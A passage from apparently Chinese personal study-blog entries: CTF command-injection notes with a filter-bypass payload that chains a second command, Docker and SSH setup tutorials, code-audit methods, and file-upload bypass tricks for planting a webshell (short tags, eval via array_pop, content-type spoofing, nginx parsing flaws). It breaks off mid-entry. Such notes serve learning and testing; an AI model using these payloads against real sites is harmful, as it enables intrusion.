title="题目"></a>题目</h3><ol><li>过滤掉了数字，$和*，即不让我们使用数字，逃逸和任意字符数的通配符</li><li>我们可以使用?来代替*的通配符,URL编码中的数字会自动解码，不用担心</li><li>?c=tac%09fla?.php%26%26ls</li></ol><h2 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h2><ol><li>shell特性：两个单引号分割字符串，中间执行会自动忽略</li><li><strong>nl命令</strong>：将指定的文件添加行号标注后写到标准输出。如果不指定文件或指定文件为”-“ ，程序将从标准输入读取数据。</li><li>nl [选项]… [文件]…</li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221013194449.png"></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> ing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>acwing搭建云服务器及docker的使用</title>
      <link href="/acwing%E6%90%AD%E5%BB%BA%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8Cdocker%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>/acwing%E6%90%AD%E5%BB%BA%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8Cdocker%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="搭建云服务器"><a href="#搭建云服务器" class="headerlink" title="搭建云服务器"></a>搭建云服务器</h1><h2 id="以下环境为Ubuntu20"><a href="#以下环境为Ubuntu20" class="headerlink" title="以下环境为Ubuntu20"></a>以下环境为Ubuntu20</h2><h2 id="云平台作用"><a href="#云平台作用" class="headerlink" title="云平台作用"></a>云平台作用</h2><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220714102552.png"></p><h2 id="关系"><a href="#关系" class="headerlink" title="关系"></a>关系</h2><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220714103019.png"></p><ol><li>在租到的服务器上搭建docker类似于在服务器上又开了一台虚拟服务器，重新划分了一下服务器的房子</li><li>docker的搭建原因：docker有很强的迁移性，例如从阿里云的服务器迁移到腾讯云时，使用docker可以很容易地迁移</li><li>docker是非常独立的：可以在一个服务器上开任意多个docker</li><li>未来的开发环境是在docker所在的第三层</li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220714104459.png"></li></ol><h2 id="选择配置问题"><a href="#选择配置问题" class="headerlink" title="选择配置问题"></a>选择配置问题</h2><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220714104646.png"></p><h2 id="常规搭建步骤"><a href="#常规搭建步骤" class="headerlink" title="常规搭建步骤"></a>常规搭建步骤</h2><ol><li>配置以下本地的 <strong>~/.ssh/config</strong>文件，可以实现不用username@hostname，使用别名机制登录</li><li>配置一下免密登录<pre class="line-numbers language-none"><code class="language-none">## 免密登录1. 在本地（本子上），**ssh-keygen**，会在.ssh&#x2F;文件夹下生成密钥：id_rsa和公钥id_rsa.pub2. 之后想要免密登录哪个服务器，就将本地的公钥传给哪个服务器即可3. 在服务器中的.ssh&#x2F;路径下创建一个 **authorized_keys** 文件，然后将本地生成的密钥复制到这个文件中，如果原本就有这个文件，那么只需要在后面加上密钥即可4. 例如，想要免密登录myserver服务器，就将公钥中的内容，复制到myserver中的~&#x2F;.ssh&#x2F;authorized_keys文件里即可5. 也可以使用**ssh-copy-id myserver**一键添加公钥6. 公钥添加到.ssh&#x2F;authorized_keys中即可免密登录7. 误区：在服务器上的生成了密钥，传到了服务器本身的authorized_keys或者主机上的，**不能自己登自己**8. 可以将自己的密钥传递给多个服务器，当服务器很多时，可以实现只需服务器名字登陆![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220714164253.png)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>配置一下tmux和vim，将本地的.vimrc和.tmux.conf文件传到服务器的根目录下<pre class="line-numbers language-none"><code class="language-none">scp .vimrc .tmux.conf myserver:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h2 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h2><ol><li>登录docker官网，一步一步来就行</li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220715171552.png"></li></ol><h2 id="配置docker"><a href="#配置docker" class="headerlink" title="配置docker"></a>配置docker</h2><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;docs.docker.com&#x2F;engine&#x2F;install&#x2F;ubuntu&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="将当前用户添加到docker用户组"><a href="#将当前用户添加到docker用户组" class="headerlink" title="将当前用户添加到docker用户组"></a>将当前用户添加到docker用户组</h3><ol><li>为了避免每一次使用docker都要加上sudo权限，可以将当前用户加入安装中自动创建的docker用户组<pre class="line-numbers language-none"><code class="language-none">sudo usermod -aG docker $USER<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><ol><li>镜像：<strong>image</strong> ，相当于一个模板，每一个镜像都可以生成一堆容器，<strong>container</strong></li><li>每个image的名称：xxxx：xxxx,冒号前面为名称，冒号后面为tag,即版本号</li></ol><h3 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h3><ol><li>拉取（从docker Hub中<strong>下载</strong>一个镜像）一个镜像,此处以拉取20版ubuntu为例，镜像名称:镜像版本<pre class="line-numbers language-none"><code class="language-none">docker pull ubuntu:20.04<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>列出本地所有镜像<pre class="line-numbers language-none"><code class="language-none">docker images<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>删除某个镜像，此处以ubuntu:20为例<pre class="line-numbers language-none"><code class="language-none">docker image rm ubuntu:20.04 或者 docker rmi ubuntu:20.04<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>创建某个container的镜像<pre class="line-numbers language-none"><code class="language-none">docker [container] commit CONTAINER IMAGE_NAME:TAG<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>将镜像ubuntu:20.04导出到本地ubuntu_20_04.tar中（以另一种文件格式保存）<pre class="line-numbers language-none"><code class="language-none">docker save -o ubuntu_20_04.tar ubuntu:20.04<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>将镜像ubuntu:20.04从本地文件ubuntu_20_04.tar中加载出来<pre class="line-numbers language-none"><code class="language-none">docker load -i ubuntu_20_04.tar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h3 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h3><ol><li>利用镜像创建一个容器,create -it<pre class="line-numbers language-none"><code class="language-none">docker [container] create -it ubuntu:20.04<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>查看本地所有的容器,所有创建了的容器，不只是启动了的就加[-a]参数，如果不加-a参数的话就是默认正在启动的容器<pre class="line-numbers language-none"><code class="language-none">docker ps [-a]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>启动容器,start<pre class="line-numbers language-none"><code class="language-none">docker [container] start CONTAINER<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>停止容器,stop<pre class="line-numbers language-none"><code class="language-none">docker stop CONTAINER<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>重启容器,restart<pre class="line-numbers language-none"><code class="language-none">docker restart CONTAINER<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>创建并启动一个容器,加-d不进入,不加-d就是创建并进入容器,run,-it<pre class="line-numbers language-none"><code class="language-none">docker run -itd ubuntu:20.04<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>进入容器,先按ctrl+p,再按ctrl+q可以挂起容器<pre class="line-numbers language-none"><code class="language-none">docker attach container<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>在容器中执行命令,exec<pre class="line-numbers language-none"><code class="language-none">docker exec container command<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>删除容器，rm<pre class="line-numbers language-none"><code class="language-none">docker rm container<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>删除所有已经停止的容器，prune<pre class="line-numbers language-none"><code class="language-none">docker container prune<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>将容器container导出到本地文件xxx.rar中,export<pre class="line-numbers language-none"><code class="language-none">docker export -o xxx.rar container<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>将本地文件xxx.tar导出为镜像，并且将镜像命名为image_name:tag,import,从本地导向容器是import,从容器导向本地是export,进出关系<pre class="line-numbers language-none"><code class="language-none">docker import xxx.tar image_name:tag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>docker export/import 与docker save/load的区别<pre class="line-numbers language-none"><code class="language-none">export&#x2F;import 会丢弃记录和元数据信息，仅仅保存容器当时的快照信息，例如容器的名字就不会保留save&#x2F;load 会保留完整记录，体积更大<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li>查看某个容器的所有进程,top<pre class="line-numbers language-none"><code class="language-none">docker top container<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>查看所有容器的统计信息，包括CPU，内存，存储，网络等信息,stats<pre class="line-numbers language-none"><code class="language-none">docker stats<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>在本地和容器之间复制文件,还是和cp和scp的格式一样,先source后destination，先从后到,cp<pre class="line-numbers language-none"><code class="language-none">docker cp xxx container:xxxdocker cp container:xxx xxx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li>重命名容器,rename<pre class="line-numbers language-none"><code class="language-none">docker rename container1 container2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>修改容器限制,update<pre class="line-numbers language-none"><code class="language-none">docker update container --memory 500MB<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h3 id="容器和镜像的区别"><a href="#容器和镜像的区别" class="headerlink" title="容器和镜像的区别"></a>容器和镜像的区别</h3><ol><li>docker的生命周期：镜像image+容器container+仓库registry,容器是由镜像实例化而来</li><li>容器即为进程，是镜像的实例，是运行环境包的实例，可以针对这个环境包运行N个实例，即容器是镜像的一种具体表现形式</li><li>镜像即为文件，想象为一个盖章，可以盖到任意的docker平台中去运行</li><li>容器是基于镜像所创建的，容器中的进程依赖于镜像中的文件</li><li>docker就是一个mini版本的Linux系统，拥有完全与宿主机隔离的系统文件，进程，用户权限，网络空间等</li><li>镜像和容器的先后顺序：现有镜像后由实例的容器，虽然创建镜像可以参考某个容器，但是标准的做法是先制作镜像后跑容器</li></ol><h2 id="docker入门概念"><a href="#docker入门概念" class="headerlink" title="docker入门概念"></a>docker入门概念</h2><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220722155932.png"></p><ol><li>开发和运维工程师的结合，更快的交付<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220722160245.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220722160743.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220722163027.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220722164155.png"></li></ol><h2 id="docker和docker-hub的关系"><a href="#docker和docker-hub的关系" class="headerlink" title="docker和docker hub的关系"></a>docker和docker hub的关系</h2><ol><li>docker是官网</li><li>docker hub是安装docker镜像的仓库<h3 id="dockerfile-image-container-repository"><a href="#dockerfile-image-container-repository" class="headerlink" title="dockerfile image container repository"></a>dockerfile image container repository</h3></li><li>通过dockerfile可以生成docker image</li><li>自己制作的镜像可以上传到docker hub平台，也可以从平台上拉去我们所需要的镜像</li><li>当镜像拉取到本地后，我们可以实例化这个镜像，形成一个container(实例)了<pre class="line-numbers language-none"><code class="language-none">docker run [组织名称]&#x2F;&lt;镜像名称&gt;：[镜像标签]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h3 id="dockerfile"><a href="#dockerfile" class="headerlink" title="dockerfile"></a>dockerfile</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><ol><li><p>Dockerfile 是 Docker 比较重要的概念。它是 Docker 创建镜像的核心，它的出现给 Docker 提供了两大好处：</p></li><li><p>文本化的镜像生成操作让其方便版本管理和自动化部署</p></li><li><p>每条命令对应镜像的一层，细化操作后保证其可增量更新，复用镜像块，减小镜像体积</p></li></ol><h4 id="dockerfile的编写规则"><a href="#dockerfile的编写规则" class="headerlink" title="dockerfile的编写规则"></a>dockerfile的编写规则</h4><ol><li>使用#来注释</li><li>from指令告诉docker使用哪个镜像作为基础</li><li>run开头的指令会在创建中运行，比如安装一个软件包</li><li>copy指令将文件复制到镜像中</li><li>workdir指定工作目录</li><li>cmd/entrypoint 镜像启动执行命令</li><li>最后执行以下命令即可完成docker镜像的创建<pre class="line-numbers language-none"><code class="language-none">docker build lizheming&#x2F;drone-wechat:latest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssh</title>
      <link href="/ssh%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95/"/>
      <url>/ssh%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h1><h2 id="远程登录原理"><a href="#远程登录原理" class="headerlink" title="远程登录原理"></a>远程登录原理</h2><ol><li>安全，即使被截获也没毛病</li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220714113940.png"></li></ol><h2 id="远程登录服务器语法"><a href="#远程登录服务器语法" class="headerlink" title="远程登录服务器语法"></a>远程登录服务器语法</h2><ol><li>ssh user@hostname</li><li>user:用户名</li><li>hostname:IP地址或域名</li></ol><h3 id="初次登录会提示"><a href="#初次登录会提示" class="headerlink" title="初次登录会提示"></a>初次登录会提示</h3><ol><li>初次登录会提示<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220714110814.png"></li><li>登录后服务器的信息会记录在~/.ssh/known_hosts文件夹中</li><li>然后输入密码即可登录到服务器中</li><li>默认登录端口为22，如果想要登录某一特定端口，加上 <strong>-p</strong> 参数</li><li>假设想要登录23号端口：ssh username@hostname -p 23</li></ol><h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><ol><li>在客户端中（主机，本子）中创建文件 ~/.ssh/config   <strong>config文件就是用来创建别名机制的</strong></li><li>在文件中输入<pre class="line-numbers language-none"><code class="language-none">Host myserver1    HostName IP地址或域名    User 用户名Host myserver2    HostName IP地址或域名    User 用户名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>之后再使用服务器时，可以直接使用别名myserver1 和 myserver2</li></ol><h2 id="免密登录"><a href="#免密登录" class="headerlink" title="免密登录"></a>免密登录</h2><ol><li>在本地（本子上），<strong>ssh-keygen</strong>，会在.ssh/文件夹下生成密钥：id_rsa和公钥id_rsa.pub</li><li>之后想要免密登录哪个服务器，就将本地的公钥传给哪个服务器即可</li><li>在服务器中的.ssh/路径下创建一个 <strong>authorized_keys</strong> 文件，然后将本地生成的密钥复制到这个文件中，如果原本就有这个文件，那么只需要在后面加上密钥即可</li><li>例如，想要免密登录myserver服务器，就将公钥中的内容，复制到myserver中的~/.ssh/authorized_keys文件里即可</li><li>也可以使用<strong>ssh-copy-id myserver</strong>一键添加公钥</li><li>公钥添加到.ssh/authorized_keys中即可免密登录</li><li>误区：在服务器上的生成了密钥，传到了服务器本身的authorized_keys或者主机上的，<strong>不能自己登自己</strong></li><li>可以将自己的密钥传递给多个服务器，当服务器很多时，可以实现只需服务器名字登陆<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220714164253.png"></li></ol><h2 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h2><h3 id="为什么"><a href="#为什么" class="headerlink" title="为什么"></a>为什么</h3><ol><li>当我们需要自动化运维时，需要实现一步：<strong>登进去，执行一个命令之后，退出来</strong></li><li>当有大量服务器时，如果登进去，实现一个命令之后，再退出来就会消耗大量的人力时间</li></ol><h3 id="怎么做"><a href="#怎么做" class="headerlink" title="怎么做"></a>怎么做</h3><h4 id="命令格式"><a href="#命令格式" class="headerlink" title="命令格式"></a>命令格式</h4><ol><li>在<strong>ssh登录之后</strong>直接<strong>加上命令</strong><pre class="line-numbers language-none"><code class="language-none">ssh user@hostname command<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220714165333.png"></li><li>这个命令的执行是在服务器中实现的，结果重定向到本地</li><li>注意：单引号中的$i可以求值<pre class="line-numbers language-none"><code class="language-none">ssh myserver &#39;for ((i &#x3D; 0; i &lt; 10; i ++ )) do echo $i; done&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>双引号中的$i不可以求值<pre class="line-numbers language-none"><code class="language-none">ssh myserver &quot;for ((i &#x3D; 0; i &lt; 10; i ++ )) do echo $i; done&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h2 id="scp传文件"><a href="#scp传文件" class="headerlink" title="scp传文件"></a>scp传文件</h2><h3 id="命令格式-可以记成ssh的cp-scp"><a href="#命令格式-可以记成ssh的cp-scp" class="headerlink" title="命令格式(可以记成ssh的cp,scp)"></a>命令格式(可以记成ssh的cp,scp)</h3><ol><li>scp source destination</li><li>将source路径下的文件复制到destination中，先从后到，和cp命令一样<h4 id="一次复制多个文件"><a href="#一次复制多个文件" class="headerlink" title="一次复制多个文件"></a>一次复制多个文件</h4></li><li>scp source1 source2 destination</li></ol><h4 id="复制文件夹"><a href="#复制文件夹" class="headerlink" title="复制文件夹"></a>复制文件夹</h4><ol><li>scp -r ~/tmp myserver:/home/acs  -r放在source和destination的前面</li><li>服务器和本地的地址都可以作为source或者destination,即既可以将文件从本地传到服务器上，也可以从服务器上传到本地</li><li>本地文件使用相对路径或绝对路径都可以</li><li>服务器上的路径：服务器的地址或别名:地址（这个地址可以写绝对路径，也可以写相对于根目录的相对地址，<strong>不写的话默认为根目录</strong>）</li></ol><h4 id="指定服务器的端口号"><a href="#指定服务器的端口号" class="headerlink" title="指定服务器的端口号"></a>指定服务器的端口号</h4><pre class="line-numbers language-none"><code class="language-none">scp -P source1 source2 destination<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>注意，这个地方的-P是大写的，ssh的-p是小写的</li><li>scp的-r和-P参数尽量加在source和destination之前</li></ol><h4 id="服务器之间传"><a href="#服务器之间传" class="headerlink" title="服务器之间传"></a>服务器之间传</h4><ol><li>scp命令不止限于主机和服务器之间传文件，也可以在两台服务器之间传文件，即source和destination都可以为服务器的路径</li><li>但是必须两台服务器之间的授权非常完整，否则会报错</li><li>所以可以将一台服务器上的文件传到本地，再由本地传到另一台服务器上<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220715104640.png"></li></ol><h3 id="使用scp配置其它服务器的vim和tmux"><a href="#使用scp配置其它服务器的vim和tmux" class="headerlink" title="使用scp配置其它服务器的vim和tmux"></a>使用scp配置其它服务器的vim和tmux</h3><ol><li>vim的配置文件:  .vimrc</li><li>tmux的配置文件：  .tmux.conf</li><li>配置vim和tmux只需要将vim和tmux的配置文件传到服务器的根目录下即可<pre class="line-numbers language-none"><code class="language-none">scp .vimrc .tmux.conf myserver:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小迪老师代码审计</title>
      <link href="/%E5%B0%8F%E8%BF%AA%E8%80%81%E5%B8%88%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/%E5%B0%8F%E8%BF%AA%E8%80%81%E5%B8%88%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><h2 id="挖掘漏洞"><a href="#挖掘漏洞" class="headerlink" title="挖掘漏洞"></a>挖掘漏洞</h2><ol><li>关键字搜索：1搜变量，2搜函数关键字</li></ol><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><ol><li>fortify，批量化挖掘漏洞，静态挖掘漏洞，支持多种语言，做题先扫描一遍<h3 id="seay："><a href="#seay：" class="headerlink" title="seay："></a>seay：</h3></li><li>扫描关键字<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220713002441.png">,</li><li>输入关键字之后点击全局搜索，</li><li>但是可能封装到一个类中了，</li><li>记住勾选正则和不区分大小写，</li><li>一定要看看哪一个语句是否有变量，没有变量就是写死了，没有办法控制变量，就没办法<strong>sql注入</strong>，</li><li><strong>乱码记得切换编码</strong></li><li>由关键字搜索到具体函数，根据函数名右键全局搜索调用函数的位置<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220713003157.png"></li><li>关键字搜索，使用全局搜索,搜索可控变量或者执行函数</li><li>搜索例如select update insert 等sql语句函数，看看是否有可控变量，没有可控变量就是死sql语句，无法进行sql注入</li><li>函数查询</li><li>找到具体函数之后，右键定位函数使用的位置<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220713003157.png"></li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220713003157.png"></li></ol><h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><ol><li>搜索select</li><li>找到变量</li><li>找到变量调用函数</li><li>右键定位函数调用位置</li><li>看看页面和数据库的互动，根据回显判断注入点</li></ol><h4 id="判断过滤机制"><a href="#判断过滤机制" class="headerlink" title="判断过滤机制"></a>判断过滤机制</h4><ol><li>看配置文件，看配置文件的关键字，例如：fun、inc</li></ol><h2 id="漏洞产生的根本"><a href="#漏洞产生的根本" class="headerlink" title="漏洞产生的根本"></a>漏洞产生的根本</h2><ol><li>可控变量</li><li>特定函数，决定漏洞类型</li><li>不存在过滤或过滤不严谨存在绕过导致的安全漏洞</li></ol><h2 id="定点挖掘关键字"><a href="#定点挖掘关键字" class="headerlink" title="定点挖掘关键字"></a>定点挖掘关键字</h2><h4 id="可控变量"><a href="#可控变量" class="headerlink" title="可控变量"></a>可控变量</h4><ol><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712235655.png"></li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712235708.png"></li><li>接受来的id参数将会传递给sql语句执行<h5 id="变量的接受"><a href="#变量的接受" class="headerlink" title="变量的接受"></a>变量的接受</h5></li><li>变量的接受方式：get post</li><li>接受关键字：$_GET $_POST</li></ol><h4 id="特定函数"><a href="#特定函数" class="headerlink" title="特定函数"></a>特定函数</h4><h5 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h5><ol><li>print echo<h5 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h5><h4 id="搜索特定关键字尝试寻找特定漏洞"><a href="#搜索特定关键字尝试寻找特定漏洞" class="headerlink" title="搜索特定关键字尝试寻找特定漏洞"></a>搜索特定关键字尝试寻找特定漏洞</h4></li><li>搜索echo print 尝试挖掘的就是xss漏洞</li><li>搜索$_GET $_POST 尝试挖掘的就是安全漏洞（可控变量）</li><li>搜索select insert update sql执行语句 == sql注入漏洞</li></ol><h2 id="定点挖掘功能点"><a href="#定点挖掘功能点" class="headerlink" title="定点挖掘功能点"></a>定点挖掘功能点</h2><ol><li>我要挖掘文件上传，通过网站的浏览，发现文件上传的位置，例如会员中心，<strong>抓包分析</strong>找到源码中的特定文件代码段，进行文件上传代码分析挖掘。</li></ol><h2 id="拓展：视漏洞而定"><a href="#拓展：视漏洞而定" class="headerlink" title="拓展：视漏洞而定"></a>拓展：视漏洞而定</h2><ol><li>sql注入 数据库监控-监控到当前页面和数据库的交互过程（SQL执行语句）</li><li>断点调试：访问页面时对应代码进行断点调试（执行过程前后顺序，调用文件列表）</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> ing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传</title>
      <link href="/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="经典绕过"><a href="#经典绕过" class="headerlink" title="经典绕过"></a>经典绕过</h2><ol><li>  更改js代码绕过前端过滤</li><li>  文件后缀，大小写、如果是apache，可以多写一个不能解析的后缀，php.xxxx</li><li>  如果后端是通过content-type来进行校验的，可以将content-type修改为可以上传的文件的类型值，后端代码对应为$_FILE(“file”)</li><li>  绕过php字符内容：使用短标签= <?= ?></li><li>  绕过空格：使用转义字符’\t’ 或者 进行URL编码</li><li>  绕过[]:在php中大括号和中括号等价，可以使用{}来绕过对中括号的过滤</li><li>  绕过[]和{}：使用array_pop()函数，括号内部写传参的形式，array_pop($_POST);，以字符串的形式返回执行语句，可以配合eval()函数进行使用</li><li>  绕过对分号的过滤：最后一句不用带分号，中间的分号可以用?&gt;来进行guo’l</li></ol><h2 id="什么是文件上传漏洞"><a href="#什么是文件上传漏洞" class="headerlink" title="什么是文件上传漏洞"></a>什么是文件上传漏洞</h2><ol><li>存在文件上传的地方，就<strong>有可能有</strong>文件上传的漏洞</li><li>上传一个<strong>webshell</strong>(后门)</li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220713180202.png"></li></ol><h2 id="查找文件上传漏洞"><a href="#查找文件上传漏洞" class="headerlink" title="查找文件上传漏洞"></a>查找文件上传漏洞</h2><ol><li>脚本扫描（御剑和菜刀.爬虫）</li><li>尝试网站的应用</li></ol><h2 id="利用类型"><a href="#利用类型" class="headerlink" title="利用类型"></a>利用类型</h2><h3 id="常规类"><a href="#常规类" class="headerlink" title="常规类"></a>常规类</h3><h4 id="扫描获取上传"><a href="#扫描获取上传" class="headerlink" title="扫描获取上传"></a>扫描获取上传</h4><ol><li>扫描到敏感目录，上传地址</li></ol><h4 id="会员中心上传"><a href="#会员中心上传" class="headerlink" title="会员中心上传"></a>会员中心上传</h4><h4 id="后台系统上传"><a href="#后台系统上传" class="headerlink" title="后台系统上传"></a>后台系统上传</h4><h4 id="各种途径上传"><a href="#各种途径上传" class="headerlink" title="各种途径上传"></a>各种途径上传</h4><h3 id="CMS类"><a href="#CMS类" class="headerlink" title="CMS类"></a>CMS类</h3><ol><li>一般的文件上传不允许上传脚本格式的<h3 id="编辑器类"><a href="#编辑器类" class="headerlink" title="编辑器类"></a>编辑器类</h3></li></ol><h3 id="其他类-CVE"><a href="#其他类-CVE" class="headerlink" title="其他类/CVE"></a>其他类/CVE</h3><h3 id="配合解析漏洞下的文件类型后门测试3938"><a href="#配合解析漏洞下的文件类型后门测试3938" class="headerlink" title="配合解析漏洞下的文件类型后门测试3938"></a>配合解析漏洞下的文件类型后门测试3938</h3><ol><li>假设上传了一个木马含在图片里的文件,直接访问上传路径解析不出来，按理来说应该解析图片的同时应该解析出phpinfo()的脚本函数，但是没有<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220713182905.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220713183140.png"></li><li>在上传路径后面加上/1.php   (文件的名字不重要，重要的是文件类型是php)<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220713182720.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716084818.png"></li><li>解析漏洞是看搭建的平台的，例如apache和nginx的</li><li>nginx是可以将图片格式作为php格式执行</li></ol><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h4 id="Content-type"><a href="#Content-type" class="headerlink" title="Content-type"></a>Content-type</h4><ol><li>内容类型，一般指的是网页中存在的Content-Type，用于定义网络文件的类型和网页的编码，决定接收方以什么形式，什么编码解读这个文件</li><li>ContentType属性指定响应的 HTTP内容类型。如果未指定 ContentType，默认为TEXT/HTML</li><li>application/octet-stream 字节流，浏览器处理字节流的默认方式就是下载<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716120216.png"><pre class="line-numbers language-none"><code class="language-none">最重要的1. application&#x2F;octet-stream 字节流，浏览器处理字节流的默认方式就是下载       2. image&#x2F;png 